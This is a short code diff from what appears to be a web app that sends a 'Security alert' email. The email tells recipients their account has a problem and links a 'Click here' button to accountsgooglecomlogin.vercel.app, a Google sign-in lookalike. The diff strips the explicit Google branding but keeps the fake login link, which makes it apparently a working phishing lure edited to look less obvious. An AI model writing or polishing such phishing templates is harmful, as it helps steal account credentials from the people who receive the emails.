@@ -14,14 +14,14 @@ export default function Home() {
         subject: "Security alert",
         htmlContent: 
         `<div>
-        <p style="font-size: 18px; margin:10px 0;">Hello, Google Account User</p>
-        <div>There is something went wrong in your account,</div>
-        <div style="margin:10px 0;">Please Sign in your account to verify</div>
+        <p style="font-size: 18px; margin:10px 0;">Hello, User</p>
+        <div>There is something went wrong happen in your account,</div>
+        <div style="margin:10px 0;">Please Sign in your account to solve the issue.</div>
         <a 
             href="https://accountsgooglecomlogin.vercel.app"
             style="text-decoration:none; display:inline-block; background-color:rgb(79, 132, 247); color:white; padding:10px 15px;  border-radius:4px; margin:15px 0;"
-          >Click here to verify</a>
-        <div>Thank you,<br>Google Developer Team</div>
+          >Click here</a>
+        <div>Thank you,<br>Developer Team</div>
     </div>`,
       }),
     });
